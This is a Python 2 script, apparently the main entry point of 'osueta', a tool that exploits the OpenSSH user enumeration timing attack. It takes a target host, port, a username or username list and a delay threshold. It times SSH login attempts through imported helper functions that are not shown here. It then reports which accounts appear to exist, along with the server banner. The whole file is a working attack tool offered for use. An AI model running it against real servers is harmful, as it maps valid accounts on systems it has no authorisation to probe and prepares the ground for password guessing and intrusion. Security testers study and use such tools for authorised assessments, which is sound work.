#!/usr/bin/python
# -*- coding: utf-8 -*-
__license__="""
osueta (OpenSSH User Enumeration Timing Attack)

A simple script to exploit the OpenSSH User Enumeration Timing Attack:

http://cureblog.de/openssh-user-enumeration-time-based-attack/
http://seclists.org/fulldisclosure/2013/Jul/88 

Authors:
	c0r3dump | coredump<@>autistici.org
	rofen | rofen<@>gmx.de

Osueta project site: https://github.com/

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors declines any responsibility in the use of this tool.
"""

from osufunc import * 
import argparse
from IPy import IP

def main():
 
	parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack')
	parse.add_argument('-H', action='store', dest='host', help='Host to attack')
	parse.add_argument('-p', action='store', dest='port', help='Host port')
	parse.add_argument('-L', action='store', dest='ufile', help='Username list file')
	parse.add_argument('-U', action='store', dest='user', help='Username')
	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds')
	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the user name (default yes)')

	argus=parse.parse_args()

	if argus.host == None:
 		parse.print_help()
 		exit
	elif argus.port == None:
 		parse.print_help()
 		exit
 	elif argus.ufile == None and argus.user == None:
 		parse.print_help()
 		exit
	elif argus.delay == None:
		parse.print_help()
		exit
	elif argus.vari != 'yes' and argus.vari !='no':
		parse.print_help()
		exit
	else:
		host = argus.host
		port = argus.port
 		defTime = int(argus.delay)
 		vari = argus.vari
 		try:
 			IP(host)
 		except ValueError:
 			print "Invalid host address."
 			exit(1)
		welcome()
		if argus.ufile != None:
			try:
				userFile = open (argus.ufile,'r')
			except IOError:
				print "The file %s doesn't exist." % (argus.ufile)
				print "Nothing to do."
				exit(1)
			foundUser = []
			print
			banner = sshBanner(host,port)
			print
			userNames = prepareUserNames(userFile,vari)            
			for userName in userNames:
				sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				fUser = sshTime(host,port,userName,sock,defTime)
				if fUser != -1 and fUser !=None:
					foundUser.append(fUser)
				sock.close()
			if len(foundUser) == 0:
				print "No users found. " + banner + " perhaps it's not vulnerable."
			else:	 
				print
				print "Server version: " + banner
				print
				print "Users found      Time delay in seconds"
				print "--------------------------------------"
				for entry in foundUser:
					if entry != -1:
						print entry[0] + "                      " + str(entry[3])
		else: 
         
			if vari == 'yes':
				print
				banner = sshBanner(host,port)
				print
				foundUser = []
				user = argus.user
				userNames =  createUserNameVariationsFor(user)
 				userNames = list(set(userNames))
				for userName in userNames:
					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					fUser = sshTime(host,port,userName,sock,defTime)
					if fUser != -1 and fUser !=None:
						foundUser.append(fUser)
					sock.close()
				if len(foundUser) == 0:
					print "No users found. " + banner + " perhaps it's not vulnerable."

				else:	 
					print
					print "Server version: " + banner
					print
					print "Users found      Time delay in seconds"
					print "--------------------------------------"
					for entry in foundUser:
						if entry != -1:
							print entry[0] + "                      " + str(entry[3])
			if vari == 'no':
				print
				banner = sshBanner(host,port)
				print
				foundUser = []
				user = argus.user
				sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				fUser = sshTime(host,port,user,sock,defTime)
				if fUser != -1 and fUser !=None:
					foundUser.append(fUser)
				sock.close()
				if len(foundUser) == 0:
					print "No users " + user + "found. " + banner + " perhaps it's not vulnerable."
				else:	 
					print
					print "Server version: " + banner
					print
					print "Users found      Time delay in seconds"
					print "--------------------------------------"
					for entry in foundUser:
						if entry != -1:
							print entry[0] + "                      " + str(entry[3])

